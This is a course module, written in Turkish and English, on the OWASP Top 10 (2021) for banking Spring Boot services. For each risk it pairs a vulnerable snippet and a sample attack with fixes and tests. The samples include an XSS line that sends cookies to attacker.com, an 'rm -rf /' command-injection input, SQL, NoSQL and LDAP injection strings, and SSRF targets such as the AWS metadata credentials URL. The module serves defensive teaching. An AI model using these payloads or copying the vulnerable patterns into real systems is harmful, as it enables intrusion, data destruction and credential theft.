# Topic 8.7 — OWASP Top 10 (2021) — Banking Perspective

## Hedef

OWASP Top 10 2021 listesini banking domain'inde derinlemesine öğrenmek. Her risk için: banking saldırı senaryosu, vulnerable code örneği, defense pattern, Spring Boot/Java fix, detection. CWE numaraları, real-world breach örnekleri.

## Süre

Okuma: 3 saat • Mini task: 3 saat • Test: 1 saat • Toplam: ~7 saat

## Önbilgi

- Topic 8.2-8.6 bitti
- HTTP protokol, REST, SQL temel
- Spring Security 6 temel

---

## Kavramlar

### Background — OWASP Top 10 nedir?

OWASP (Open Web Application Security Project) her 3 yılda en kritik web vulnerability'lerini sıralar. 2021 listesi:

1. **A01 — Broken Access Control**
2. **A02 — Cryptographic Failures**
3. **A03 — Injection**
4. **A04 — Insecure Design**
5. **A05 — Security Misconfiguration**
6. **A06 — Vulnerable and Outdated Components**
7. **A07 — Identification and Authentication Failures**
8. **A08 — Software and Data Integrity Failures**
9. **A09 — Security Logging and Monitoring Failures**
10. **A10 — Server-Side Request Forgery (SSRF)**

Banking için **A01** ve **A03** en yüksek frequency; **A02** ve **A08** en yüksek impact.

---

### A01 — Broken Access Control

**CWE-284, CWE-285, CWE-639, CWE-862...**

Authentication = "kim?". Authorization = "ne yapabilir?". A01 = authorization arızası.

#### Banking saldırı senaryosu — IDOR (Insecure Direct Object Reference)

```
User A login. User A's URL: GET /api/accounts/12345
User A sees: own account info OK.

Attacker (logged in as User A) tries: GET /api/accounts/12346

Vulnerable code:
@GetMapping("/accounts/{id}")
public Account getAccount(@PathVariable Long id) {
    return accountRepo.findById(id).orElseThrow();   // ❌ no ownership check
}

→ User A sees User B's account. BREACH.
```

**Real banking risk:** Hesap bilgisi, transaction history, kredi limiti, statement download. Banking için **highest severity**.

#### Defense — domain-level check

```java
@GetMapping("/accounts/{id}")
@PreAuthorize("@accountSecurityService.canAccess(#id, authentication)")
public Account getAccount(@PathVariable UUID id) {
    return accountRepo.findById(id).orElseThrow();
}

@Service
public class AccountSecurityService {
    
    private final AccountRepository accountRepo;
    
    public boolean canAccess(UUID accountId, Authentication auth) {
        UUID userId = UUID.fromString(auth.getName());
        return accountRepo.existsByIdAndOwnerId(accountId, userId);
    }
}
```

Better — repo-level scoping:

```java
@RestController
public class AccountController {
    
    @GetMapping("/accounts/{id}")
    public Account getAccount(
        @PathVariable UUID id,
        @AuthenticationPrincipal Jwt jwt
    ) {
        UUID userId = UUID.fromString(jwt.getSubject());
        return accountRepo.findByIdAndOwnerId(id, userId)
            .orElseThrow(() -> new AccountNotFoundException(id));
            // ⚠️ Throw NOT FOUND, not FORBIDDEN —
            // information leak prevention (existence)
    }
}
```

#### Vertical privilege escalation

```
Customer user → admin endpoint access
```

```java
// ❌ check missing
@DeleteMapping("/admin/users/{id}")
public void deleteUser(@PathVariable UUID id) {
    userService.delete(id);
}

// ✓ Spring Security
@DeleteMapping("/admin/users/{id}")
@PreAuthorize("hasRole('admin')")
public void deleteUser(@PathVariable UUID id) { ... }

// ✓ SecurityConfig pathway
.requestMatchers("/admin/**").hasRole("admin")
```

#### Method-level auth — fine-grained

```java
@PostMapping("/transfers")
@PreAuthorize("hasAuthority('SCOPE_transfer.write') and @transferLimitService.canTransfer(#req, authentication)")
public Transfer transfer(@RequestBody TransferRequest req, Authentication auth) { ... }
```

#### CORS misconfiguration → cross-origin access

```java
// ❌ All origins
@CrossOrigin(origins = "*")

// ✓ Whitelist
@CrossOrigin(origins = {"https://app.mavibank.com", "https://m.mavibank.com"})
```

#### Spring Security 6 — secure defaults

```java
@Configuration
@EnableMethodSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(a -> a
                .requestMatchers("/v1/public/**").permitAll()
                .requestMatchers("/admin/**").hasRole("admin")
                .requestMatchers("/v1/teller/**").hasRole("teller")
                .anyRequest().authenticated())   // ✓ deny by default
            .oauth2ResourceServer(o -> o.jwt(j -> j.jwtAuthenticationConverter(...)));
        return http.build();
    }
}
```

**Deny by default:** Açık permit verilmediği sürece authenticated zorunlu.

---

### A02 — Cryptographic Failures

**CWE-259, CWE-296, CWE-310, CWE-319, CWE-321, CWE-326, CWE-327...**

Sensitive data exposure. Eski adı "Sensitive Data Exposure".

#### Banking örnekler

```java
// ❌ Plain HTTP
http://api.mavibank.com/v1/login   (TLS yok)

// ❌ MD5 hash şifre
String hash = md5(password);

// ❌ Hardcoded crypto key
private static final String KEY = "secret";

// ❌ ECB mode encryption
Cipher.getInstance("AES/ECB/PKCS5Padding");

// ❌ Self-signed cert (production)

// ❌ TLS 1.0 / 1.1 enabled

// ❌ PAN plaintext DB'de
column tc_kimlik = "12345678901"

// ❌ Sensitive data log'da
log.info("User {} logged in with password {}", user, password);

// ❌ Sensitive data URL query string
GET /transfer?from=1234&to=5678&amount=1000&pin=1234
```

#### Defenses

Topic 8.6'da detaylı. Özet:
- TLS 1.2+ mandatory (banking 1.3 preferred)
- HSTS header
- AES-256-GCM (no ECB, no plain CBC without AEAD)
- BCrypt/Argon2 password (no MD5/SHA1)
- KMS/Vault for keys (no hardcoded)
- Column encryption + tokenization
- Logging filter for PII

#### Logging filter — Logback custom pattern

```xml
<configuration>
    <appender name="STDOUT" class="ch.qos.logback.core.ConsoleAppender">
        <encoder>
            <pattern>%d{ISO8601} %-5level %logger{36} - %replace(%msg){'(?i)(password|pin|tc[_ ]?kimlik|pan)=([^\s,]+)', '$1=***'}%n</pattern>
        </encoder>
    </appender>
</configuration>
```

Veya MaskingService:

```java
@Aspect
public class LogMaskingAspect {
    
    @Around("@annotation(Log)")
    public Object maskSensitiveArgs(ProceedingJoinPoint pjp) throws Throwable {
        Object[] args = pjp.getArgs();
        Object[] masked = Arrays.stream(args)
            .map(this::mask)
            .toArray();
        log.info("Calling {} with args {}", pjp.getSignature(), masked);
        return pjp.proceed();
    }
    
    private Object mask(Object arg) {
        if (arg instanceof String s) {
            // Mask if looks like PAN/TC
            if (s.matches("\\d{16}|\\d{11}")) {
                return s.substring(0, 2) + "***" + s.substring(s.length() - 2);
            }
        }
        return arg;
    }
}
```

---

### A03 — Injection

**CWE-79 (XSS), CWE-89 (SQLi), CWE-77 (Command Injection), CWE-90 (LDAP), CWE-94 (Code Injection)...**

#### SQL Injection

```java
// ❌ String concatenation
public User findByUsername(String username) {
    String sql = "SELECT * FROM users WHERE username = '" + username + "'";
    return jdbcTemplate.queryForObject(sql, ...);
}

Attack: username = "admin' OR '1'='1"
SQL becomes: SELECT * FROM users WHERE username = 'admin' OR '1'='1'
→ Returns first user (often admin).
```

**Fix — parameterized query:**

```java
// ✓ JdbcTemplate
String sql = "SELECT * FROM users WHERE username = ?";
return jdbcTemplate.queryForObject(sql, params(username), rowMapper);

// ✓ JPA
@Query("SELECT u FROM User u WHERE u.username = :username")
Optional<User> findByUsername(@Param("username") String username);

// ✓ MyBatis
<select id="findByUsername" parameterType="String" resultType="User">
    SELECT * FROM users WHERE username = #{username}
</select>
```

**Stored procedure call:**

```java
// ✓ CallableStatement
CallableStatement cs = conn.prepareCall("{call get_user(?)}");
cs.setString(1, username);
ResultSet rs = cs.executeQuery();
```

#### NoSQL injection (MongoDB)

```javascript
// ❌
db.users.findOne({username: req.body.username, password: req.body.password});

Attack: { "$ne": null }
→ Returns any user.
```

Spring Data MongoDB parametrize otomatik:

```java
@Query("{username: ?0, password: ?1}")
Optional<User> findByCredentials(String username, String hashedPassword);
```

#### XSS (Cross-Site Scripting)

```jsp
<%-- ❌ unescaped user input --%>
<div>Welcome ${user.name}</div>

Attack: name = "<script>fetch('https://attacker.com/' + document.cookie)</script>"
→ Cookie exfiltrate.
```

**Fix:**
- Thymeleaf escape default: `<div th:text="${user.name}"></div>`
- React/Vue framework default escape (dangerouslySetInnerHTML hariç)
- API JSON only → XSS attack surface dramatic azalır
- CSP header

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
```

#### Command Injection

```java
// ❌
Process p = Runtime.getRuntime().exec("ping " + userInput);

Attack: userInput = "8.8.8.8; rm -rf /"
```

**Fix:** Avoid shell exec. If needed, use ProcessBuilder with array:

```java
ProcessBuilder pb = new ProcessBuilder("ping", "-c", "1", validatedIp);
```

#### LDAP Injection

```java
// ❌
String filter = "(&(uid=" + userInput + ")(password=" + pw + "))";

Attack: userInput = "*)(uid=*"
→ filter = "(&(uid=*)(uid=*)(password=...))"
```

**Fix:** Spring LDAP `LdapQueryBuilder`:

```java
LdapQuery query = LdapQueryBuilder.query()
    .where("uid").is(username);
```

#### Spring `@Valid` defense

```java
@PostMapping("/transfers")
public Transfer transfer(@Valid @RequestBody TransferRequest req) { ... }

public record TransferRequest(
    @NotNull @Pattern(regexp = "^[A-Z]{2}\\d{2}[A-Z0-9]{1,30}$") String iban,
    @NotNull @DecimalMin("0.01") @DecimalMax("100000") BigDecimal amount,
    @NotNull @Size(max = 200) String description
) {}
```

Validation **before** business logic.

---

### A04 — Insecure Design

**Yeni 2021 kategorisi.** Implementation hatası değil, **design hatası**.

#### Banking örnekler

**1. Password reset only by email:**

```
User: "Forgot password" → enter email → email link sent → reset
```

Attacker email account compromise → tüm bankalar reset.

**Banking better:** Email + SMS + security questions + MFA.

**2. Transfer without secondary confirmation:**

```
POST /transfers (amount: 100000 TL)
→ Just authorized? OK transfer.
```

Banking better: Yüksek tutar → OTP/biometric onayı. **Step-up authentication.**

**3. Account number generation predictable:**

```
account_number = userId + "01"   (sequential)
```

Attacker iterate ederek diğer hesap numaralarını bulur (IDOR'ün design version).

**Banking better:** Cryptographically random account numbers (IBAN check digit).

**4. Soft delete with sensitive data:**

```
DELETE /users → set deleted=true, keep all PII
```

KVKK violation. **Crypto-shredding** (Topic 8.6).

**5. Rate limiting only on auth endpoint:**

```
/login → rate limited.
/transfers → unlimited.
```

Saldırgan once login → flood transfers (DoS or fraud).

#### Defense — threat modeling

**STRIDE:**
- Spoofing
- Tampering
- Repudiation
- Information disclosure
- Denial of service
- Elevation of privilege

Banking için her feature design phase'inde STRIDE walkthrough.

**Misuse cases:** "Saldırgan ne yapmaya çalışır?" senaryo.

---

### A05 — Security Misconfiguration

**CWE-2, CWE-11, CWE-13, CWE-15, CWE-16...**

#### Banking örnekler

**1. Spring Boot actuator open:**

```yaml
management:
  endpoints:
    web:
      exposure:
        include: "*"   # ❌ /env, /heapdump exposed
```

Attacker `/actuator/env` → DB credentials.

**Fix:**

```yaml
management:
  endpoints:
    web:
      exposure:
        include: health, info, prometheus
  endpoint:
    health:
      probes:
        enabled: true
      show-details: when-authorized
```

**2. Default credentials:**

```
Keycloak admin/admin
H2 console / sa / empty
Tomcat manager / tomcat
```

Banking production: changed + IP allowlist + MFA.

**3. Error stack traces exposed:**

```
500 Internal Server Error
java.sql.SQLException: ORA-00942: table or view does not exist
  at com.bank.AccountRepo.findById(AccountRepo.java:45)
  ...
```

Attacker DB schema bilgisi alır.

**Fix:**

```java
@ControllerAdvice
public class GlobalExceptionHandler {
    
    @ExceptionHandler(Exception.class)
    public ResponseEntity<ProblemDetail> handle(Exception e, WebRequest req) {
        log.error("Unhandled exception", e);   // Full stack to log
        
        ProblemDetail pd = ProblemDetail.forStatusAndDetail(
            HttpStatus.INTERNAL_SERVER_ERROR,
            "An unexpected error occurred");
        pd.setProperty("traceId", MDC.get("traceId"));
        return ResponseEntity.internalServerError().body(pd);
    }
}
```

User sees: opaque error + traceId. Internal log: full detail.

**4. HTTP methods overly permissive:**

```
OPTIONS /transfers → returns all CRUD allowed
```

CSRF attack avenue. Whitelist HTTP methods.

**5. Security headers missing:**

```http
HTTP/1.1 200 OK
Content-Type: application/json

(missing: X-Frame-Options, X-Content-Type-Options, CSP, HSTS)
```

**Fix Spring Security:**

```java
http
    .headers(h -> h
        .contentTypeOptions(Customizer.withDefaults())
        .frameOptions(f -> f.deny())
        .xssProtection(Customizer.withDefaults())
        .httpStrictTransportSecurity(hsts -> hsts
            .includeSubDomains(true)
            .maxAgeInSeconds(31536000)
            .preload(true))
        .contentSecurityPolicy(csp -> csp
            .policyDirectives("default-src 'self'; script-src 'self'")));
```

**6. CORS too permissive:**

Yukarıda A01'de.

**7. Verbose `Server` header:**

```http
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.4
```

Version fingerprint → known CVE targeting.

```yaml
server:
  server-header: ""   # Hide
```

**8. Listening on `0.0.0.0` for internal services:**

Internal service should bind to localhost / private network only.

**9. Docker container running as root:**

```dockerfile
# ❌ Default root
FROM eclipse-temurin:21
COPY app.jar /app.jar
CMD ["java", "-jar", "/app.jar"]
```

```dockerfile
# ✓ Non-root user
FROM eclipse-temurin:21
RUN groupadd -r app && useradd -r -g app app
COPY --chown=app:app app.jar /app.jar
USER app
CMD ["java", "-jar", "/app.jar"]
```

---

### A06 — Vulnerable and Outdated Components

**CWE-1104, CWE-937, CWE-1035...**

Log4Shell (CVE-2021-44228) bu kategoriden.

#### Defense

**1. Maven/Gradle dependency scan:**

```xml
<plugin>
    <groupId>org.owasp</groupId>
    <artifactId>dependency-check-maven</artifactId>
    <version>9.0.0</version>
    <configuration>
        <failBuildOnCVSS>7</failBuildOnCVSS>
        <suppressionFile>suppressions.xml</suppressionFile>
    </configuration>
</plugin>
```

CI'de `mvn dependency-check:check`.

**2. SBOM (Software Bill of Materials):**

```bash
mvn cyclonedx:makeBom
# bom.xml — all transitive deps
```

Banking regulatory: SBOM mandatory (supply chain).

**3. Snyk / Dependabot / Renovate:**

GitHub auto-update PR'lar.

**4. Container scan:**

```bash
trivy image mavibank/account-service:1.0
grype mavibank/account-service:1.0
```

**5. License compliance:**

Banking GPL-licensed library mostly forbidden (legal).

**6. Update strategy:**

- Security patches: hemen
- Minor versions: bi-weekly
- Major versions: planned migration
- EOL versions: deprecation roadmap

---

### A07 — Identification and Authentication Failures

**CWE-287, CWE-297, CWE-384, CWE-521...**

Topic 8.2 ve 8.3'te detaylı. Özet:

#### Banking checklist

- [ ] Strong password policy (12+ char, complexity, breach check)
- [ ] BCrypt/Argon2 (no MD5/SHA1)
- [ ] Brute force protection (5 fail / 15 min lockout)
- [ ] MFA (TOTP, WebAuthn, SMS OTP)
- [ ] Session timeout (idle 30 min, absolute 8 hours)
- [ ] Session ID regen on login (session fixation prevention)
- [ ] Logout server-side invalidation (not just client-side)
- [ ] Secure cookie flags (Secure, HttpOnly, SameSite=Strict)
- [ ] JWT short TTL + refresh rotation
- [ ] Authentication event audit

#### Session fixation

```
Attacker: GET /login → server sends SESSIONID=abc
Attacker: lures victim to URL with SESSIONID=abc
Victim: logs in → server keeps SESSIONID=abc
Attacker: uses SESSIONID=abc → authenticated as victim
```

**Fix:** On successful login, **regenerate session ID** (Spring Security default).

#### Cookie security

```java
@Bean
public CookieSerializer cookieSerializer() {
    DefaultCookieSerializer serializer = new DefaultCookieSerializer();
    serializer.setCookieName("BANKING_SESSION");
    serializer.setUseSecureCookie(true);
    serializer.setUseHttpOnlyCookie(true);
    serializer.setSameSite("Strict");
    serializer.setCookiePath("/");
    serializer.setDomainName("mavibank.com");
    return serializer;
}
```

---

### A08 — Software and Data Integrity Failures

**CWE-345, CWE-353, CWE-426, CWE-494...**

#### Banking örnekler

**1. Insecure deserialization (Java):**

```java
// ❌
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();
```

Saldırgan **gadget chain** ile RCE.

**Fix:** JSON kullan (Jackson). Java deserialization YOK. Şart varsa **allowlist**:

```java
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.bank.dto.*;!*");
ois.setObjectInputFilter(filter);
```

**2. Unsigned auto-update:**

App auto-update endpoint signed değil → attacker MITM malicious update.

**Fix:** Code signing (jarsigner). Verify on update.

**3. CI/CD pipeline compromise:**

Jenkinsfile injectable, npm package compromised. Banking için:
- Pipeline as code (audited)
- Signed commits (GPG)
- Two-person review (banking critical)
- Build artifact signature
- Production deploy approval gate

**4. Webhook integrity:**

```java
// ❌ accept any POST as legit
@PostMapping("/webhook/payment")
public void handle(@RequestBody PaymentEvent event) { ... }
```

Attacker forge webhook.

**Fix:** HMAC signature verify:

```java
@PostMapping("/webhook/payment")
public void handle(
    @RequestBody String body,
    @RequestHeader("X-Signature") String signature
) {
    String expected = hmacSha256(body, webhookSecret);
    if (!MessageDigest.isEqual(expected.getBytes(), signature.getBytes())) {
        throw new SecurityException("Invalid signature");
    }
    PaymentEvent event = objectMapper.readValue(body, PaymentEvent.class);
    ...
}
```

**5. Kafka message tamper:**

Kafka producer → Kafka cluster → consumer. Tamper edilirse?

Banking: **Sign each message** (HMAC or JWS). Consumer verify.

---

### A09 — Security Logging and Monitoring Failures

**CWE-117, CWE-223, CWE-532, CWE-778...**

#### Banking örnekler

**1. Failed login not logged:**

```java
// ❌
if (!password.matches(user.password)) {
    return ResponseEntity.status(401).build();
}
```

Brute force görünmez.

**Fix:** Auth event audit (Topic 8.2):

```java
@EventListener
public void onFailure(AbstractAuthenticationFailureEvent event) {
    auditService.log(event.getAuthentication().getName(), "LOGIN_FAILED", ...);
}
```

**2. PII in logs:**

```java
log.info("User logged in: name={}, tc={}", user.name, user.tcKimlik);   // ❌ KVKK violation
```

LogMaskingAspect (A02'de).

**3. No real-time alerts:**

Banking için SIEM (Splunk, ELK, Datadog Security):
- Failed login > threshold → alert
- Privileged action → alert
- Sensitive table read → alert
- Brute force pattern → block + alert

**4. Log retention insufficient:**

Banking regulatory: **5-10 yıl** log retention. BDDK ≥ 5 yıl.

**5. Audit trail tamper-proof değil:**

Log file mutable → attacker compromise → silmek mümkün.

**Banking better:** WORM (Write-Once-Read-Many) storage. Blockchain-like append-only. Cryptographic chain (each log includes hash of previous).

#### Audit table schema

```sql
CREATE TABLE audit_log (
    id BIGSERIAL PRIMARY KEY,
    occurred_at TIMESTAMPTZ DEFAULT now(),
    user_id UUID,
    action VARCHAR(100),
    resource_type VARCHAR(50),
    resource_id VARCHAR(100),
    ip_address INET,
    user_agent TEXT,
    details JSONB,
    previous_hash CHAR(64),
    current_hash CHAR(64)
);

CREATE INDEX idx_audit_user_time ON audit_log(user_id, occurred_at DESC);
CREATE INDEX idx_audit_action ON audit_log(action);
```

`current_hash = SHA256(previous_hash + occurred_at + user_id + action + resource_id + details)`.

Tamper detection: rebuild chain → mismatch.

#### Sensitive operations to audit

- Login (success/fail)
- Logout
- Password change
- MFA enroll/disable
- Profile change (KVKK)
- Permission change (role assign)
- Transfer initiated
- Card block/unblock
- Large transaction
- Admin action (any)
- API key generation

---

### A10 — Server-Side Request Forgery (SSRF)

**CWE-918**

#### Banking saldırı senaryosu

```java
// "URL preview" feature
@PostMapping("/preview")
public String preview(@RequestParam String url) {
    return restTemplate.getForObject(url, String.class);   // ❌ no validation
}
```

Attacker: `url = http://169.254.169.254/latest/meta-data/iam/security-credentials/`

AWS metadata service → IAM credentials → take over bank's AWS account.

Other targets:
- `http://localhost:8500/v1/kv/...` (Consul)
- `http://localhost:6379` (Redis)
- `file:///etc/passwd`
- Internal services not exposed (admin APIs)

#### Defenses

**1. URL allowlist:**

```java
@Value("${ssrf.allowed-hosts}")
private Set<String> allowedHosts;

public String preview(String url) {
    URI uri = URI.create(url);
    if (!allowedHosts.contains(uri.getHost())) {
        throw new SecurityException("Host not allowed");
    }
    if (!Set.of("http", "https").contains(uri.getScheme())) {
        throw new SecurityException("Only HTTP(S) allowed");
    }
    return restTemplate.getForObject(uri, String.class);
}
```

**2. Block private IP ranges:**

```java
public boolean isPublicIp(String host) {
    try {
        InetAddress addr = InetAddress.getByName(host);
        return !addr.isLoopbackAddress() 
            && !addr.isLinkLocalAddress()
            && !addr.isSiteLocalAddress()
            && !addr.isAnyLocalAddress()
            && !addr.isMulticastAddress();
    } catch (UnknownHostException e) {
        return false;
    }
}
```

**3. DNS rebinding prevention:**

```
Attacker controls evil.com DNS:
  First resolution: public IP (passes allowlist check)
  Second resolution: 169.254.169.254 (after check, used in actual request)
```

Resolve **once**, use IP directly:

```java
InetAddress[] addrs = InetAddress.getAllByName(uri.getHost());
for (InetAddress addr : addrs) {
    if (!isPublicIp(addr)) {
        throw new SecurityException();
    }
}
// Use addr in actual request
URL url = new URL(uri.getScheme(), addrs[0].getHostAddress(), uri.getPort(), uri.getPath());
```

**4. AWS IMDSv2:**

AWS EC2 metadata service v2 requires token → SSRF GET'i çalışmaz.

```bash
# IMDSv2 required
aws ec2 modify-instance-metadata-options --instance-id i-xxx --http-tokens required
```

**5. Network segmentation:**

Service should not be able to reach internal admin APIs:
- VPC security group
- Egress NetworkPolicy (K8s)

---

## 11. Banking — OWASP defense kombinasyonu

Banking-grade `SecurityConfig` örnek:

```java
@Configuration
@EnableWebSecurity
@EnableMethodSecurity
public class BankingSecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(a -> a
                .requestMatchers("/v1/public/**").permitAll()
                .requestMatchers("/v1/auth/**").permitAll()
                .requestMatchers("/actuator/health").permitAll()
                .requestMatchers("/admin/**").hasRole("admin")
                .anyRequest().authenticated())
            .csrf(c -> c.disable())   // JWT API only
            .sessionManagement(s -> s.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            .oauth2ResourceServer(o -> o.jwt(Customizer.withDefaults()))
            .headers(h -> h
                .contentTypeOptions(Customizer.withDefaults())
                .frameOptions(f -> f.deny())
                .httpStrictTransportSecurity(hsts -> hsts
                    .includeSubDomains(true)
                    .maxAgeInSeconds(31536000)
                    .preload(true))
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives("default-src 'none'; frame-ancestors 'none'"))
                .referrerPolicy(r -> r.policy(ReferrerPolicy.NO_REFERRER))
                .permissionsPolicy(p -> p.policy("geolocation=(), microphone=(), camera=()")))
            .cors(c -> c.configurationSource(corsConfig()));
        return http.build();
    }
    
    @Bean
    public CorsConfigurationSource corsConfig() {
        CorsConfiguration cors = new CorsConfiguration();
        cors.setAllowedOrigins(List.of(
            "https://app.mavibank.com",
            "https://m.mavibank.com"));
        cors.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE"));
        cors.setAllowedHeaders(List.of("Authorization", "Content-Type", "X-Idempotency-Key"));
        cors.setMaxAge(3600L);
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/**", cors);
        return source;
    }
}
```

---

## Önemli olabilecek araştırma kaynakları

- OWASP Top 10 2021
- OWASP Cheat Sheet Series
- CWE Top 25
- BDDK güvenlik tebliği
- KVKK rehber dökümanları
- PCI-DSS v4 ASV scan
- NIST SP 800-53
- ASVS (Application Security Verification Standard)

---

## Mini task'ler

### Task 8.7.1 — IDOR fix (60 dk)

`/accounts/{id}` endpoint'i ownership check'siz. Reproduce attack. Fix repo-level scoping (`findByIdAndOwnerId`).

### Task 8.7.2 — SQL injection reproduce + fix (45 dk)

Login form string concatenation. Reproduce `' OR '1'='1`. Fix parameterized query.

### Task 8.7.3 — Security headers (30 dk)

CSP, HSTS, X-Frame-Options, X-Content-Type-Options config. Test with `securityheaders.com` benzeri tool.

### Task 8.7.4 — Actuator lockdown (30 dk)

`/actuator/env` exposed → fix. `/actuator/health` only public, rest authenticated.

### Task 8.7.5 — OWASP dependency-check (45 dk)

Maven plugin ekle. Vulnerable dependency (eski log4j) ekle. Build fail.

### Task 8.7.6 — Insecure deserialization demo (45 dk)

`ObjectInputStream` endpoint. ysoserial ile gadget chain demo. ObjectInputFilter ile fix.

### Task 8.7.7 — Audit table + hash chain (60 dk)

`audit_log` table. Each row `current_hash = SHA256(prev_hash + row data)`. Tamper detection.

### Task 8.7.8 — SSRF demo + fix (60 dk)

`/preview?url=...` endpoint. Reproduce `http://169.254.169.254/...`. Fix allowlist + private IP block + DNS rebind prevent.

### Task 8.7.9 — Logging mask (45 dk)

Log statement TC/PAN/password mask. Logback pattern OR Aspect.

### Task 8.7.10 — Global exception handler (30 dk)

Stack trace leak fix. ProblemDetail RFC 7807. traceId correlation.

### Task 8.7.11 — Webhook HMAC verify (30 dk)

`X-Signature: HMAC-SHA256(body, secret)`. Verify timing-safe (`MessageDigest.isEqual`).

### Task 8.7.12 — DAST scan (45 dk)

OWASP ZAP local scan. Banking app'e karşı baseline scan. Report review.

---

## Test yazma rehberi

```java
@Test
void shouldRejectIdorAttempt() throws Exception {
    Account otherUserAccount = createAccountForUser(otherUserId);
    
    mockMvc.perform(get("/v1/accounts/" + otherUserAccount.getId())
        .header("Authorization", bearer(myToken)))
        .andExpect(status().isNotFound());   // Not Forbidden (info leak)
}

@Test
void shouldPreventSqlInjection() throws Exception {
    mockMvc.perform(post("/auth/login")
        .contentType(MediaType.APPLICATION_JSON)
        .content("""
            {"username": "admin' OR '1'='1", "password": "anything"}
            """))
        .andExpect(status().isUnauthorized());
}

@Test
void shouldEnforceSecurityHeaders() throws Exception {
    mockMvc.perform(get("/v1/public/info"))
        .andExpect(header().string("Strict-Transport-Security", 
            containsString("max-age=31536000")))
        .andExpect(header().string("X-Content-Type-Options", "nosniff"))
        .andExpect(header().string("X-Frame-Options", "DENY"))
        .andExpect(header().exists("Content-Security-Policy"));
}

@Test
void shouldNotExposeStackTrace() throws Exception {
    mockMvc.perform(get("/v1/accounts/abc-invalid-uuid")
        .header("Authorization", bearer(myToken)))
        .andExpect(jsonPath("$.detail").value(not(containsString("Exception"))))
        .andExpect(jsonPath("$.detail").value(not(containsString("at com.bank"))))
        .andExpect(jsonPath("$.traceId").exists());
}

@Test
void shouldRejectSsrfToMetadataService() throws Exception {
    mockMvc.perform(post("/v1/preview")
        .param("url", "http://169.254.169.254/latest/meta-data/")
        .header("Authorization", bearer(token)))
        .andExpect(status().isForbidden());
}

@Test
void shouldRejectSsrfToLocalhost() throws Exception {
    mockMvc.perform(post("/v1/preview")
        .param("url", "http://localhost:8500/v1/kv/secret")
        .header("Authorization", bearer(token)))
        .andExpect(status().isForbidden());
}

@Test
void shouldMaskSensitiveDataInLogs() {
    String logMsg = LogMaskingAspect.maskSensitive(
        "User login: tc=12345678901, pan=4532148803436467");
    
    assertThat(logMsg).doesNotContain("12345678901");
    assertThat(logMsg).doesNotContain("4532148803436467");
}

@Test
void shouldVerifyWebhookSignature() throws Exception {
    String body = "{\"event\": \"payment.completed\"}";
    String signature = hmacSha256(body, webhookSecret);
    
    mockMvc.perform(post("/webhook/payment")
        .contentType(MediaType.APPLICATION_JSON)
        .header("X-Signature", signature)
        .content(body))
        .andExpect(status().isOk());
    
    // Tampered
    mockMvc.perform(post("/webhook/payment")
        .contentType(MediaType.APPLICATION_JSON)
        .header("X-Signature", "invalid")
        .content(body))
        .andExpect(status().isUnauthorized());
}

@Test
void shouldDetectAuditTrailTampering() {
    auditService.log(userId, "LOGIN", ...);
    auditService.log(userId, "TRANSFER", ...);
    auditService.log(userId, "LOGOUT", ...);
    
    assertThat(auditService.verifyChain()).isTrue();
    
    // Tamper
    em.createNativeQuery("UPDATE audit_log SET action = 'FAKE' WHERE id = 2")
        .executeUpdate();
    
    assertThat(auditService.verifyChain()).isFalse();
}
```

---

## Claude-verify prompt

```
OWASP Top 10 hardening'imi banking-grade kriterlere göre değerlendir:

A01 — Broken Access Control:
- Repo-level scoping (findByIdAndOwnerId)?
- @PreAuthorize method-level?
- Deny by default (.anyRequest().authenticated())?
- CORS whitelist (no wildcard)?
- Not Found NOT Forbidden (info leak prevention)?

A02 — Cryptographic Failures:
- TLS 1.2+ only?
- HSTS header?
- AES-256-GCM (not ECB)?
- BCrypt/Argon2 password?
- KMS/Vault keys?
- Log masking PII?

A03 — Injection:
- Parameterized SQL/JPA?
- Thymeleaf/React auto-escape?
- ProcessBuilder array (not concat)?
- @Valid input?

A04 — Insecure Design:
- Step-up authentication high-value?
- Password reset multi-factor?
- Cryptographically random IDs?
- Rate limit beyond auth?
- Threat model document?

A05 — Security Misconfiguration:
- Actuator endpoint lockdown?
- Default credentials changed?
- Stack trace hide (ProblemDetail)?
- Security headers (HSTS, CSP, XFO, XCT)?
- Server header empty?
- Container non-root?

A06 — Vulnerable Components:
- OWASP dependency-check in CI?
- Trivy/Snyk container scan?
- SBOM (CycloneDX)?
- Patch policy?

A07 — Identification/Auth Failures:
- Strong password (12+, complexity, breach)?
- BCrypt strength 12 / Argon2?
- Brute force (5/15)?
- MFA banking high-value?
- Session ID regen on login?
- Cookie Secure+HttpOnly+SameSite?

A08 — Software/Data Integrity:
- Java deserialization YOK / ObjectInputFilter?
- Webhook HMAC?
- Audit hash chain?
- Signed commits / build artifacts?

A09 — Logging/Monitoring:
- Failed login logged?
- PII masked in logs?
- SIEM real-time alert?
- 5-10 yıl retention?
- Tamper-proof (hash chain / WORM)?

A10 — SSRF:
- URL allowlist?
- Private IP block?
- DNS rebind prevention (resolve once)?
- AWS IMDSv2?
- Network segmentation (NetworkPolicy)?

Her madde için PASS / FAIL / EKSIK işaretle.
```

---

## Tamamlama kriterleri

- [ ] A01: IDOR fix + @PreAuthorize + deny-by-default
- [ ] A02: TLS + AES-GCM + KMS + log masking
- [ ] A03: SQL injection fix + @Valid + XSS prevent
- [ ] A04: Step-up auth + threat model doc
- [ ] A05: Actuator lockdown + headers + ProblemDetail
- [ ] A06: dependency-check CI + Trivy + SBOM
- [ ] A07: Strong auth + MFA + session regen
- [ ] A08: ObjectInputFilter + webhook HMAC + audit chain
- [ ] A09: SIEM + retention + PII mask
- [ ] A10: SSRF fix + allowlist + private IP block
- [ ] 12+ test (her A için minimum 1)

---

## Defter notları (10 madde)

1. "A01 Broken Access Control banking IDOR örnek + repo-level fix: ____."
2. "A02 TLS 1.3 + KMS + log masking banking üçleme: ____."
3. "A03 SQL injection parametrize fix + @Valid + XSS thymeleaf escape: ____."
